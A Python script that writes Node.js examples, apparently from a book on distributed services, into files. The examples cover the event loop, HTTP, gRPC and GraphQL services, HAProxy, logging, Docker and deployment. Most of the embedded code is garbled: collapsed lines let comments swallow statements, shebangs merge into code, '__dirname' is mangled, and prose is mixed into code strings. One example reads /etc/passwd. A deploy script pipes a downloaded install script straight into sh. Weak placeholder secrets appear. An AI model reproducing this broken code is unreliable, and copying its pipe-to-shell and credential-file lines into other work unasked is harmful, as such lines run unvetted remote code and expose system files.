import os

def create_folders_file(path,code):
  
  indexOfSlash = path.rfind("/")
  
  folder = path[:indexOfSlash]
  os.makedirs(folder, exist_ok=True)
  print(folder)
  
  fileName = path[indexOfSlash+1:] 
  with open(path, 'a') as f:
    f.write(code)  

path='Example_1-1.js'
code='''function a() { b(); }function b() { c(); } function c() { /**/ }function x() { y(); }function y() { z(); } function z() { /**/ }setTimeout(x, 0); a();''' 
create_folders_file(path,code)

path='Example_1-2.js'
code='''setTimeout(() => console.log('A'), 0); console.log('B');setTimeout(() => console.log('C'), 100); setTimeout(() => console.log('D'), 0);let i = 0;while (i < 1_000_000_000) { // Assume this takes ~500ms let ignore = Math.sqrt(i);i++;}console.log('E');''' 
create_folders_file(path,code)

path='Example_1-3.js'
code='''#!/usr/bin/env nodeconst fs = require('fs'); fs.readFile('/etc/passwd', (err, data) => {  if (err) throw err; console.log(data);});setImmediate(  () => { console.log('This runs while file is being read');});''' 
create_folders_file(path,code)

path='Example_1-4.js'
code='''const t1 = setTimeout(() => {}, 1_000_000);  const t2 = setTimeout(() => {}, 2_000_000); // ...t1.unref(); // ... clearTimeout(t2); ''' 
create_folders_file(path,code)

path='event-loop-phases.js'
code='''const fs = require('fs');setImmediate(() => console.log(1)); Promise.resolve().then(() => console.log(2)); process.nextTick(() => console.log(3)); fs.readFile(  filename, () => {console.log(4);setTimeout(() => console.log(5)); setImmediate(() => console.log(6)); process.nextTick(() => console.log(7));});console.log(8);''' 
create_folders_file(path,code)

path='recipe-api/producer-http-basic.js'
code='''#!/usr/bin/env node// npm install fastify@3.2const server = require('fastify')();const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 4000;console.log(`worker pid=${process.pid}`); server.get('/recipes/:id', async (req, reply) => {console.log(`worker request pid=${process.pid}`); const id = Number(req.params.id);if (id !== 42) { reply.statusCode = 404;return { error: 'not_found' };}return {producer_pid: process.pid, recipe: {id, name: "Chicken Tikka Masala", steps: "Throw it in a pot...", ingredients: [{ id: 1, name: "Chicken", quantity: "1 lb", },{ id: 2, name: "Sauce", quantity: "2 cups", }]}};});server.listen(PORT, HOST, () => {console.log(`Producer running at http://${HOST}:${PORT}`);});''' 
create_folders_file(path,code)

path='web-api/consumer-http-basic.js'
code='''#!/usr/bin/env node// npm install fastify@3.2 node-fetch@2.6 const server = require('fastify')(); const fetch = require('node-fetch');const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 3000;const TARGET = process.env.TARGET || 'localhost:4000';server.get('/', async () => {const req = await fetch(`http://${TARGET}/recipes/42`); const producer_data = await req.json();return {consumer_pid: process.pid, producer_data};});server.listen(PORT, HOST, () => {console.log(`Consumer running at http://${HOST}:${PORT}/`);});''' 
create_folders_file(path,code)

path='Example_2-1.js'
code='''#!/usr/bin/env node// npm install node-fetch@2.6const fetch = require('node-fetch');(async() => {const req = await fetch('http://localhost:3002/data', {method: 'POST', headers: {'Content-Type': 'application/json','User-Agent': `nodejs/${process.version}`, 'Accept': 'application/json'},body: JSON.stringify({ foo: 'bar'})});const payload = await req.json(); console.log(payload);})();''' 
create_folders_file(path,code)

path='Example_2-2.js'
code='''POST /data HTTP/1.1 Content-Type: application/json  User-Agent: nodejs/v14.8.0 Accept: application/jsonContent-Length: 13Accept-Encoding: gzip,deflate Connection: closeHost: localhost:3002{"foo":"bar"} ''' 
create_folders_file(path,code)

path='Example_2-3.js'
code='''HTTP/1.1 403 Forbidden  Server: nginx/1.16.0 Date: Tue, 29 Oct 2019 15:29:31 GMTContent-Type: application/json; charset=utf-8 Content-Length: 33Connection: keep-alive Cache-Control: no-cache Vary: accept-encoding{"error":"must_be_authenticated"} ''' 
create_folders_file(path,code)


path='server-gzip.js'
code='''#!/usr/bin/env node// Adapted from https://nodejs.org/api/zlib.html// Warning: Not as efficient as using a Reverse Proxy const zlib = require('zlib');const http = require('http'); const fs = require('fs');http.createServer((request, response) => {const raw = fs.createReadStream(  dirname + '/index.html'); const acceptEncoding = request.headers['accept-encoding'] || ''; response.setHeader('Content-Type', 'text/plain'); console.log(acceptEncoding);if (acceptEncoding.includes('gzip')) { console.log('encoding with gzip'); response.setHeader('Content-Encoding', 'gzip');raw.pipe(zlib.createGzip()).pipe(response);} else {console.log('no encoding'); raw.pipe(response);}}).listen(process.env.PORT || 1337);''' 
create_folders_file(path,code)

path='Example 2-5. Comparing compressed versus uncompressed requests'
code='''$ curl http://localhost:1337/ | wc -c$ curl -H 'Accept-Encoding: gzip' http://localhost:1337/ | wc -c''' 
create_folders_file(path,code)

path='Example 2-6. Generating a self-signed certificate'
code='''$ mkdir -p ./{recipe-api,shared}/tls$ openssl req -nodes -new -x509 \-keyout recipe-api/tls/basic-private-key.key \-out shared/tls/basic-certificate.certThis command creates two files, namely basic-private-key.key (the private key) and basic-certificate.cert (the public key).Next, copy the recipe-api/producer-http-basic.js service that you made in Example 1-6 to a new file named recipe-api/producer-https-basic.js to resemble Example 2-7. This is an HTTPS server built entirely with Node.js.Example 2-7. recipe-api/producer-https-basic.js#!/usr/bin/env node// npm install fastify@3.2// Warning: Not as efficient as using a Reverse Proxy const fs = require('fs');const server = require('fastify')({ https: { key: fs.readFileSync(  dirname+'/tls/basic-private-key.key'),cert: fs.readFileSync(  dirname+'/../shared/tls/basic-certificate.cert'),}});const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 4000;server.get('/recipes/:id', async (req, reply) => { const id = Number(req.params.id);if (id !== 42) { reply.statusCode = 404;return { error: 'not_found' };}return {producer_pid: process.pid,recipe: {id, name: "Chicken Tikka Masala", steps: "Throw it in a pot...", ingredients: [{ id: 1, name: "Chicken", quantity: "1 lb", },{ id: 2, name: "Sauce", quantity: "2 cups", }]}};});server.listen(PORT, HOST, () => {console.log(`Producer running at https://${HOST}:${PORT}`);});''' 
create_folders_file(path,code)

path='recipe-api/producer-https-basic.js'
code='''#!/usr/bin/env node// npm install fastify@3.2// Warning: Not as efficient as using a Reverse Proxy const fs = require('fs');const server = require('fastify')({ https: { key: fs.readFileSync(  dirname+'/tls/basic-private-key.key'),cert: fs.readFileSync(  dirname+'/../shared/tls/basic-certificate.cert'),}});const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 4000;server.get('/recipes/:id', async (req, reply) => { const id = Number(req.params.id);if (id !== 42) { reply.statusCode = 404;return { error: 'not_found' };}return {producer_pid: process.pid,recipe: {id, name: "Chicken Tikka Masala", steps: "Throw it in a pot...", ingredients: [{ id: 1, name: "Chicken", quantity: "1 lb", },{ id: 2, name: "Sauce", quantity: "2 cups", }]}};});server.listen(PORT, HOST, () => {console.log(`Producer running at https://${HOST}:${PORT}`);});''' 
create_folders_file(path,code)

path='web-api/consumer-https-basic.js'
code='''#!/usr/bin/env node// npm install fastify@3.2 node-fetch@2.6// Warning: Not as efficient as using a Reverse Proxyconst server = require('fastify')(); const fetch = require('node-fetch'); const https = require('https'); const fs = require('fs');const HOST = '127.0.0.1';const PORT = process.env.PORT || 3000;const TARGET = process.env.TARGET || 'localhost:4000';const options = {agent: new https.Agent({ ca: fs.readFileSync(  dirname+'/../shared/tls/basic-certificate.cert'),})};server.get('/', async () => {const req = await fetch(`https://${TARGET}/recipes/42`, options);const payload = await req.json();return {consumer_pid: process.pid, producer_data: payload};});server.listen(PORT, HOST, () => {console.log(`Consumer running at http://${HOST}:${PORT}/`);});''' 
create_folders_file(path,code)

path='Example 2-9. How to be your own Certificate Authority'
code='''# Happens once for the CA$ openssl genrsa -des3 -out ca-private-key.key 2048 $ openssl req -x509 -new -nodes -key ca-private-key.key \-sha256 -days 365 -out shared/tls/ca-certificate.cert # Happens for each new certificate$ openssl genrsa -out recipe-api/tls/producer-private-key.key 2048 $ openssl req -new -key recipe-api/tls/producer-private-key.key \-out recipe-api/tls/producer.csr $ openssl x509 -req -in recipe-api/tls/producer.csr \-CA shared/tls/ca-certificate.cert \-CAkey ca-private-key.key -CAcreateserial \-out shared/tls/producer-certificate.cert -days 365 -sha256 CSR: Generate a private key ca-private-key.key for the Certificate Authority.''' 
create_folders_file(path,code)

path='shared/graphql-schema.gql'
code='''type Query {  recipe(id: ID): Recipe pid: Int}type Recipe {  id: ID!name: String! steps: Stringingredients: [Ingredient]! }type Ingredient { id: ID!name: String! quantity: String}''' 
create_folders_file(path,code)

path='recipe-api/producer-graphql.js'
code='''#!/usr/bin/env node// npm install fastify@3.2 fastify-gql@5.3 const server = require('fastify')();const graphql = require('fastify-gql'); const fs = require('fs');const schema = fs.readFileSync( dirname + '/../shared/graphql-schema.gql').toString(); const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 4000;const resolvers = {  Query: { pid: () => process.pid,recipe: async (_obj, {id}) => {if (id != 42) throw new Error(`recipe ${id} not found`); return {id, name: "Chicken Tikka Masala", steps: "Throw it in a pot...",}}},Recipe: { ingredients: async (obj) => { return (obj.id != 42) ? [] : [{ id: 1, name: "Chicken", quantity: "1 lb", },{ id: 2, name: "Sauce", quantity: "2 cups", }]}}};server.register(graphql, { schema, resolvers, graphiql: true }) .listen(PORT, HOST, () => {console.log(`Producer running at http://${HOST}:${PORT}/graphql`);});''' 
create_folders_file(path,code)

path='web-api/consumer-graphql.js'
code='''#!/usr/bin/env node// npm install fastify@3.2 node-fetch@2.6 const server = require('fastify')(); const fetch = require('node-fetch'); const HOST = '127.0.0.1';const PORT = process.env.PORT || 3000;const TARGET = process.env.TARGET || 'localhost:4000'; const complex_query = `query kitchenSink ($id:ID) { recipe(id: $id) { id name ingredients {name quantity}}pid}`;server.get('/', async () => {const req = await fetch(`http://${TARGET}/graphql`, { method: 'POST',headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ query: complex_query, variables: { id: "42" }}),});return {consumer_pid: process.pid, producer_data: await req.json()};});server.listen(PORT, HOST, () => {console.log(`Consumer running at http://${HOST}:${PORT}/`);});''' 
create_folders_file(path,code)

path='shared/grpc-recipe.proto'
code='''syntax = "proto3"; package recipe;service RecipeService { rpc GetRecipe(RecipeRequest) returns (Recipe) {} rpc GetMetaData(Empty) returns (Meta) {}}message Recipe { int32 id = 1;  string name = 2; string steps = 3;repeated Ingredient ingredients = 4; }message Ingredient { int32 id = 1; string name = 2;string quantity = 3;}message RecipeRequest { int32 id = 1;}message Meta {  int32 pid = 2;}message Empty {}''' 
create_folders_file(path,code)

path='recipe-api/producer-grpc.js'
code='''#!/usr/bin/env node// npm install @grpc/grpc-js@1.1 @grpc/proto-loader@0.5 const grpc = require('@grpc/grpc-js');const loader = require('@grpc/proto-loader'); const pkg_def = loader.loadSync( dirname +'/../shared/grpc-recipe.proto'); const recipe = grpc.loadPackageDefinition(pkg_def).recipe; const HOST = process.env.HOST || '127.0.0.1';const PORT = process.env.PORT || 4000; const server = new grpc.Server();server.addService(recipe.RecipeService.service, {  getMetaData: (_call, cb) => { cb(null, {pid: process.pid,});},getRecipe: (call, cb) => { if (call.request.id !== 42) {return cb(new Error(`unknown recipe ${call.request.id}`));}cb(null, {id: 42, name: "Chicken Tikka Masala", steps: "Throw it in a pot...", ingredients: [{ id: 1, name: "Chicken", quantity: "1 lb", },{ id: 2, name: "Sauce", quantity: "2 cups", }]});},});server.bindAsync(`${HOST}:${PORT}`, grpc.ServerCredentials.createInsecure(),  (err, port) => {if (err) throw err; server.start();console.log(`Producer running at http://${HOST}:${port}/`);});''' 
create_folders_file(path,code)

path='web-api/consumer-grpc.js'
code='''#!/usr/bin/env node// npm install @grpc/grpc-js@1.1 @grpc/proto-loader@0.5 fastify@3.2 const util = require('util');const grpc = require('@grpc/grpc-js'); const server = require('fastify')();const loader = require('@grpc/proto-loader'); const pkg_def = loader.loadSync( dirname +'/../shared/grpc-recipe.proto'); const recipe = grpc.loadPackageDefinition(pkg_def).recipe; const HOST = '127.0.0.1';const PORT = process.env.PORT || 3000;const TARGET = process.env.TARGET || 'localhost:4000';const client = new recipe.RecipeService(  TARGET,grpc.credentials.createInsecure() );const getMetaData = util.promisify(client.getMetaData.bind(client)); const getRecipe = util.promisify(client.getRecipe.bind(client));server.get('/', async () => {const [meta, recipe] = await Promise.all([ getMetaData({}), getRecipe({id: 42}), ]);return {consumer_pid: process.pid, producer_data: meta, recipe};});server.listen(PORT, HOST, () => {console.log(`Consumer running at http://${HOST}:${PORT}/`);});''' 
create_folders_file(path,code)

path='recipe-api/producer-http-basic-master.js'
code='''#!/usr/bin/env nodeconst cluster = require('cluster');  console.log(`master pid=${process.pid}`); cluster.setupMaster({exec:   dirname+'/producer-http-basic.js' });cluster.fork();  cluster.fork();cluster.on('disconnect', (worker) => {  console.log('disconnect', worker.id);}).on('exit', (worker, code, signal) => { console.log('exit', worker.id, code, signal);// cluster.fork(); }).on('listening', (worker, {address, port}) => {console.log('listening', worker.id, `${address}:${port}`);});''' 
create_folders_file(path,code)

path='cluster-fibonacci.js'
code='''#!/usr/bin/env node// npm install fastify@3.2const server = require('fastify')();const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 4000;console.log(`worker pid=${process.pid}`); server.get('/:limit', async (req, reply) => { return String(fibonacci(Number(req.params.limit)));});server.listen(PORT, HOST, () => {console.log(`Producer running at http://${HOST}:${PORT}`);});function fibonacci(limit) {  let prev = 1n, next = 0n, swap; while (limit) {swap = prev;prev = prev + next; next = swap;limit--;}return next;}''' 
create_folders_file(path,code)

path='haproxy/stats.cfg'
code='''frontend inbound  mode http bind localhost:8000 stats enable stats uri /admin?stats''' 
create_folders_file(path,code)

path='web-api/consumer-http-healthendpoint.js'
code='''server.get('/health', async () => { console.log('health check'); return 'OK';});''' 
create_folders_file(path,code)

path='haproxy/load-balance.cfg'
code='''defaults  mode httptimeout connect 5000ms  timeout client 50000ms timeout server 50000msfrontend inboundbind localhost:3000 default_backend web-api  stats enablestats uri /admin?statsbackend web-api option httpchk GET /health server web-api-1 localhost:3001 check  server web-api-2 localhost:3002 check''' 
create_folders_file(path,code)

path='haproxy/compression.cfg'
code='''defaults mode httptimeout connect 5000ms timeout client 50000ms timeout server 50000msfrontend inboundbind localhost:3000 default_backend web-apibackend web-api compression offload  compression algo gzip compression type application/json text/plain  server web-api-1 localhost:3001''' 
create_folders_file(path,code)

path='Example 3-7. Generating a .pem file'
code='''$ openssl req -nodes -new -x509 \-keyout haproxy/private.key \-out haproxy/certificate.cert$ cat haproxy/certificate.cert haproxy/private.key \ ''' 
create_folders_file(path,code)

path='haproxy/tls.cfg'
code='''defaults mode httptimeout connect 5000ms timeout client 50000ms timeout server 50000msglobal tune.ssl.default-dh-param 2048frontend inboundbind localhost:3000 ssl crt haproxy/combined.pem  default_backend web-api backend web-apiserver web-api-1 localhost:3001'''
create_folders_file(path,code)

path='low-connections.js'
code='''#!/usr/bin/env nodeconst http = require('http');const server = http.createServer((req, res) => { console.log('current conn', server._connections); setTimeout(() => res.end('OK'), 10_000); });server.maxConnections = 2;  server.listen(3020, 'localhost');''' 
create_folders_file(path,code)

path='haproxy/backpressure.cfg'
code='''defaults maxconn 8  mode httpfrontend inboundbind localhost:3010 default_backend web-apibackend web-api option httpclose server web-api-1 localhost:3020 maxconn 2 ''' 
create_folders_file(path,code)

path='benchmark/native-http.js'
code='''#!/usr/bin/env nodeconst HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 4000;require("http").createServer((req, res) => { res.end('ok');}).listen(PORT, () => {console.log(`Producer running at http://${HOST}:${PORT}`);});''' 
create_folders_file(path,code)

path='haproxy/benchmark-basic.cfg'
code='''defaults mode httpfrontend inboundbind localhost:4001 default_backend native-httpbackend native-httpserver native-http-1 localhost:4000''' 
create_folders_file(path,code)

path='haproxy/passthru.cfg'
code='''defaults mode tcptimeout connect 5000ms timeout client 50000ms timeout server 50000msfrontend inboundbind localhost:3000default_backend server-apibackend server-apiserver server-api-1 localhost:3001''' 
create_folders_file(path,code)

path='Example 2-7.js'
code='''$ PORT=3001 node recipe-api/producer-https-basic.js$ haproxy -f haproxy/passthru.cfg$ autocannon -d 60 -c 10 https://localhost:3000/recipes/42''' 
create_folders_file(path,code)

path='haproxy/fibonacci.cfg'
code='''defaults mode httpfrontend inboundbind localhost:5000 default_backend fibonaccibackend fibonacciserver fibonacci-1 localhost:5001 # server fibonacci-2 localhost:5002 # server fibonacci-3 localhost:5003''' 
create_folders_file(path,code)

path='misc/elk/udp.conf'
code='''input { udp {id => "nodejs_udp_logs" port => 7777codec => json}}output { elasticsearch {hosts => ["localhost:9200"] document_type => "nodelog" manage_template => falseindex => "nodejs-%{+YYYY.MM.dd}"}}''' 
create_folders_file(path,code)

path='Running ELK within Docker'
code='''$ sudo sysctl -w vm.max_map_count=262144 # Linux Only$ docker run -p 5601:5601 -p 9200:9200 \-p 5044:5044 -p 7777:7777/udp \-v $PWD/misc/elk/udp.conf:/etc/logstash/conf.d/99-input-udp.conf \-e MAX_MAP_COUNT=262144 \-it --name distnode-elk sebp/elk:683''' 
create_folders_file(path,code)

path='web-api/consumer-http-logs.js'
code='''#!/usr/bin/env node// npm install fastify@3.2 node-fetch@2.6 middie@5.1 const server = require('fastify')();const fetch = require('node-fetch');const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 3000;const TARGET = process.env.TARGET || 'localhost:4000'; const log = require('./logstash.js'); (async () => {await server.register(require('middie'));  server.use((req, res, next) => { log('info', 'request-incoming', { path: req.url, method: req.method, ip: req.ip, ua: req.headers['user-agent'] || null });next();});server.setErrorHandler(async (error, req) => { log('error', 'request-failure', {stack: error.stack, path: req.url, method: req.method, }); return { error: error.message };});server.get('/', async () => {const url = `http://${TARGET}/recipes/42`;log('info', 'request-outgoing', {url, svc: 'recipe-api'});  const req = await fetch(url);const producer_data = await req.json();return { consumer_pid: process.pid, producer_data };});server.get('/error', async () => { throw new Error('oh no'); }); server.listen(PORT, HOST, () => {log('verbose', 'listen', {host: HOST, port: PORT}); });})();The new logstash.js file is now being loaded.''' 
create_folders_file(path,code)

path='web-api/logstash.js'
code='''const client = require('dgram').createSocket('udp4');  const host = require('os').hostname();const [LS_HOST, LS_PORT] = process.env.LOGSTASH.split(':');  const NODE_ENV = process.env.NODE_ENV;module.exports = function(severity, type, fields) { const payload = JSON.stringify({ '@timestamp': (new Date()).toISOString(),"@version": 1, app: 'web-api', environment: NODE_ENV, severity, type, fields, host});console.log(payload); client.send(payload, LS_PORT, LS_HOST);};''' 
create_folders_file(path,code)

path='Running web-api and generating logs'
code='''$ NODE_ENV=development LOGSTASH=localhost:7777 \ node web-api/consumer-http-logs.js$ node recipe-api/producer-http-basic.js$ brew install watch # required for macOS$ watch -n5 curl http://localhost:3000$ watch -n13 curl http://localhost:3000/error''' 
create_folders_file(path,code)


path='StatsDGraphiteGrafana'
code='''$ docker run \-p 8080:80 \-p 8125:8125/udp \-it --name distnode-graphite graphiteapp/graphite-statsd:1.1.6-1$ docker run \-p 8000:3000 \-it --name distnode-grafana grafana/grafana:6.5.2''' 
create_folders_file(path,code)

path='web-api/consumer-http-metrics.js'
code='''#!/usr/bin/env node// npm install fastify@3.2 node-fetch@2.6 statsd-client@0.4.4 middie@5.1 const server = require('fastify')();const fetch = require('node-fetch'); const HOST = '127.0.0.1';const PORT = process.env.PORT || 3000;const TARGET = process.env.TARGET || 'localhost:4000'; const SDC = require('statsd-client');const statsd = new (require('statsd-client'))({host: 'localhost', port: 8125, prefix: 'web-api'}); (async () => {await server.register(require('middie')); server.use(statsd.helpers.getExpressMiddleware('inbound', { timeByUrl: true})); server.get('/', async () => {const begin = new Date();const req = await fetch(`http://${TARGET}/recipes/42`); statsd.timing('outbound.recipe-api.request-time', begin);  statsd.increment('outbound.recipe-api.request-count');  const producer_data = await req.json();return { consumer_pid: process.pid, producer_data };});server.get('/error', async () => { throw new Error('oh no'); }); server.listen(PORT, HOST, () => {console.log(`Consumer running at http://${HOST}:${PORT}/`);});})();''' 
create_folders_file(path,code)

path='web-api/consumer-http-metrics.js'
code='''const v8 = require('v8'); const fs = require('fs');setInterval(() => {statsd.gauge('server.conn', server.server._connections); const m = process.memoryUsage();  statsd.gauge('server.memory.used', m.heapUsed); statsd.gauge('server.memory.total', m.heapTotal);const h = v8.getHeapStatistics();  statsd.gauge('server.heap.size', h.used_heap_size); statsd.gauge('server.heap.limit', h.heap_size_limit);fs.readdir('/proc/self/fd', (err, list) => { if (err) return;statsd.gauge('server.descriptors', list.length); });const begin = new Date();setTimeout(() => { statsd.timing('eventlag', begin); }, 0); }, 10_000);''' 
create_folders_file(path,code)

path='web-api/consumer-http-zipkin.js'
code='''#!/usr/bin/env node// npm install fastify@3.2 node-fetch@2.6 zipkin-lite@0.1 const server = require('fastify')();const fetch = require('node-fetch');const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 3000;const TARGET = process.env.TARGET || 'localhost:4000'; const ZIPKIN = process.env.ZIPKIN || 'localhost:9411'; const Zipkin = require('zipkin-lite');const zipkin = new Zipkin({  zipkinHost: ZIPKIN,serviceName: 'web-api', servicePort: PORT, serviceIp: HOST, init: 'short' });server.addHook('onRequest', zipkin.onRequest());  server.addHook('onResponse', zipkin.onResponse());server.get('/', async (req) => { req.zipkin.setName('get_root'); const url = `http://${TARGET}/recipes/42`; const zreq = req.zipkin.prepare(); const recipe = await fetch(url, { headers: zreq.headers }); zreq.complete('GET', url);const producer_data = await recipe.json();return {pid: process.pid, producer_data, trace: req.zipkin.trace};});server.listen(PORT, HOST, () => {console.log(`Consumer running at http://${HOST}:${PORT}/`);});''' 
create_folders_file(path,code)

path='recipe-api/producer-http-zipkin.js'
code='''const PORT = process.env.PORT || 4000;const ZIPKIN = process.env.ZIPKIN || 'localhost:9411'; const Zipkin = require('zipkin-lite');const zipkin = new Zipkin({ zipkinHost: ZIPKIN,serviceName: 'recipe-api', servicePort: PORT, serviceIp: HOST,});server.addHook('onRequest', zipkin.onRequest()); server.addHook('onResponse', zipkin.onResponse());server.get('/recipes/:id', async (req, reply) => { req.zipkin.setName('get_recipe');const id = Number(req.params.id);''' 
create_folders_file(path,code)


path='Running Postgres and Redis'
code='''$ docker run \--rm \-p 5432:5432 \-e POSTGRES_PASSWORD=hunter2 \-e POSTGRES_USER=tmp \-e POSTGRES_DB=tmp \ postgres:12.3$ docker run \--rm \-p 6379:6379 \redis:6.0''' 
create_folders_file(path,code)

path='basic-http-healthcheck.js'
code='''#!/usr/bin/env node// npm install fastify@3.2 ioredis@4.17 pg@8.3 const server = require('fastify')();const HOST = '0.0.0.0';const PORT = 3300;const redis = new (require("ioredis"))({enableOfflineQueue: false});  const pg = new (require('pg').Client)();pg.connect(); // Note: Postgres will not reconnect on failureserver.get('/health', async (req, reply) => { try {const res = await pg.query('SELECT $1::text as status', ['ACK']); if (res.rows[0].status !== 'ACK') reply.code(500).send('DOWN');} catch(e) { reply.code(500).send('DOWN'); }// ... other down checks ... let status = 'OK';try {if (await redis.ping() !== 'PONG') status = 'DEGRADED';} catch(e) {status = 'DEGRADED'; }// ... other degraded checks ... reply.code(200).send(status);});server.listen(PORT, HOST, () => console.log(`http://${HOST}:${PORT}/`));''' 
create_folders_file(path,code)

path='config/production.env'
code='''TIME_ZONE=America/Los_Angeles  ADMIN_EMAIL=admin@example.org CABOT_FROM_EMAIL=cabot@example.org DJANGO_SECRET_KEY=abcd1234WWW_HTTP_HOST=localhost:5000 WWW_SCHEME=http# GRAPHITE_API=http://<YOUR-IP-ADDRESS>:8080/ TWILIO_ACCOUNT_SID=<YOUR_TWILIO_ACCOUNT_SID>  TWILIO_AUTH_TOKEN=<YOUR_TWILIO_AUTH_TOKEN> TWILIO_OUTGOING_NUMBER=<YOUR_TWILIO_NUMBER>''' 
create_folders_file(path,code)

path='recipe-api/.dockerignore'
code='''node_modules npm-debug.log Dockerfile''' 
create_folders_file(path,code)

path='recipe-api/Dockerfile �deps� stage'
code='''FROM node:14.8.0-alpine3.12 AS depsWORKDIR /srvCOPY package*.json ./RUN npm ci --only=production# COPY package.json yarn.lock ./ # RUN yarn install --production''' 
create_folders_file(path,code)

path='recipe-api/Dockerfile'
code='''FROM alpine:3.12 AS releaseENV V 14.8.0ENV FILE node-v$V-linux-x64-musl.tar.xzRUN apk add --no-cache libstdc++ \&& apk add --no-cache --virtual .deps curl \ && curl -fsSLO --compressed \"https://unofficial-builds.nodejs.org/download/release/v$V/$FILE" \ && tar -xJf $FILE -C /usr/local --strip-components=1 \&& rm -f $FILE /usr/local/bin/npm /usr/local/bin/npx \ && rm -rf /usr/local/lib/node_modules \&& apk del .deps''' 
create_folders_file(path,code)

path='recipe-api/Dockerfile'
code='''WORKDIR /srvCOPY --from=deps /srv/node_modules ./node_modules COPY . .EXPOSE 1337ENV HOST 0.0.0.0ENV PORT 1337CMD [ "node", "producer-http-basic.js" ]''' 
create_folders_file(path,code)

path='Example 5-5. Building an image from a Dockerfile'
code='''$ cd recipe-api$ docker build -t tlhunter/recipe-api:v0.0.1 .''' 
create_folders_file(path,code)

path='recipe-api/producer-http-basic.js'
code='''server.get('/recipes/:id', async (req, reply) => {return "Hello, world!";});''' 
create_folders_file(path,code)

path='recipe-api/Dockerfile-zipkin'
code='''FROM node:14.8.0-alpine3.12 WORKDIR /srvCOPY package*.json ./RUN npm ci --only=production COPY . .CMD [ "node", "producer-http-zipkin.js" ]''' 
create_folders_file(path,code)

path='docker-compose.yml'
code='''version: "3.7" services:zipkin: image: openzipkin/zipkin-slim:2.19  ports: - "127.0.0.1:9411:9411"''' 
create_folders_file(path,code)

path='docker-compose.yml'
code='''## note the two space indent recipe-api:build: context: ./recipe-api dockerfile: Dockerfile-zipkinports:- "127.0.0.1:4000:4000"environment:  HOST: 0.0.0.0ZIPKIN: zipkin:9411 depends_on: - zipkin''' 
create_folders_file(path,code)

path='docker-compose.yml'
code='''## note the two space indent web-api:build:context: ./web-api dockerfile: Dockerfile-zipkinports:- "127.0.0.1:3000:3000"environment:TARGET: recipe-api:4000 ZIPKIN: zipkin:9411 HOST: 0.0.0.0depends_on:''' 
create_folders_file(path,code)

path='distnode-deploy/server.js'
code='''#!/usr/bin/env node// npm install fastify@3.2const server = require('fastify')();const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 8000;const Recipe = require('./recipe.js');server.get('/', async (req, reply) => { return "Hello from Distributed Node.js!";});server.get('/recipes/:id', async (req, reply) => { const recipe = new Recipe(req.params.id);await recipe.hydrate(); return recipe;});server.listen(PORT, HOST, (err, host) => { console.log(`Server running at ${host}`);});''' 
create_folders_file(path,code)

path='distnode-deploy/recipe.js'
code='''module.exports = class Recipe { constructor(id) {this.id = Number(id); this.name = null;}async hydrate() { // Pretend DB Lookup this.name = `Recipe: #${this.id}`;}toJSON() {return { id: this.id, name: this.name };}};''' 
create_folders_file(path,code)

path='distnode-deploy/.travis.yml'
code='''language: node_js node_js: - "14"install: ''' 
create_folders_file(path,code)

path='distnode-deploy/test/unit.js'
code='''#!/usr/bin/env node// npm install -D tape@5 const test = require('tape');const Recipe = require('../recipe.js'); test('Recipe#hydrate()', async (t) => {  const r = new Recipe(42);await r.hydrate();t.equal(r.name, 'Recipe: #42', 'name equality'); });test('Recipe#serialize()', (t) => { const r = new Recipe(17);t.deepLooseEqual(r, { id: 17, name: null }, 'serializes properly'); t.end(); });''' 
create_folders_file(path,code)

path='distnode-deploy/test/integration.js'
code='''#!/usr/bin/env node// npm install --save-dev tape@5 node-fetch@2.6 const { spawn } = require('child_process'); const test = require('tape');const fetch = require('node-fetch');const serverStart = () => new Promise((resolve, _reject) => { const server = spawn('node', ['../server.js'], { env: Object.assign({}, process.env, { PORT: 0 }), cwd:  dirname });server.stdout.once('data', async (data) => { const message = data.toString().trim();const url = /Server running at (.+)$/.exec(message)[1]; resolve({ server, url }); });});test('GET /recipes/42', async (t) => {const { server, url } = await serverStart(); const result = await fetch(`${url}/recipes/42`); const body = await result.json(); t.equal(body.id, 42);server.kill(); });Spawn an instance of server.js.''' 
create_folders_file(path,code)

path='distnode-deploy/.nycrc'
code='''{"reporter": ["lcov", "text-summary"], "all": true,"check-coverage": true, "branches": 100,"lines": 100,"functions": 100,"statements": 100}''' 
create_folders_file(path,code)

path='distnode-deploy/test/integration.js'
code='''test('GET /', async (t) => {const { server, url } = await serverStart(); const result = await fetch(`${url}/`);const body = await result.text();t.equal(body, 'Hello from Distributed Node.js!'); server.kill();});''' 
create_folders_file(path,code)

path='distnode-deploy/.travis.yml'
code='''deploy:provider: scriptscript: bash deploy-heroku.sh  on:branch: master  env: global:''' 
create_folders_file(path,code)

path='distnode-deploy/Dockerfile'
code='''FROM node:14.8.0-alpine3.12WORKDIR /srvCOPY package*.json ./RUN npm ci --only=production COPY . .ENV HOST=0.0.0.0CMD [ "node", "server.js" ]''' 
create_folders_file(path,code)

path='distnode-deploy/deploy-heroku.sh'
code='''#!/bin/bashwget -qO- https://toolbelt.heroku.com/install-ubuntu.sh | sh heroku plugins:install @heroku-cli/plugin-container-registry heroku container:loginheroku container:push web --app <USERNAME>-distnode heroku container:release web --app <USERNAME>-distnode''' 
create_folders_file(path,code)

path='leftish-padder/.gitignore'
code='''node_modules temp.binpackage-lock.json''' 
create_folders_file(path,code)

path='leftish-padder/.npmignore'
code='''temp.bin screenshot.bin test''' 
create_folders_file(path,code)


path='leftish-padder/index.js'
code='''module.exports = (s, p, c = ' ') => String(s).padStart(p, c);''' 
create_folders_file(path,code)

path='recipe-api/recipe-api-deployment.yml'
code='''apiVersion: apps/v1 kind: Deployment  metadata:name: recipe-api  labels:app: recipe-api ''' 
create_folders_file(path,code)

path='recipe-api/recipe-api-deployment.yml'
code='''spec:replicas: 5  selector:matchLabels:app: recipe-api template:metadata: labels:app: recipe-api''' 
create_folders_file(path,code)

path='recipe-api/recipe-api-deployment.yml'
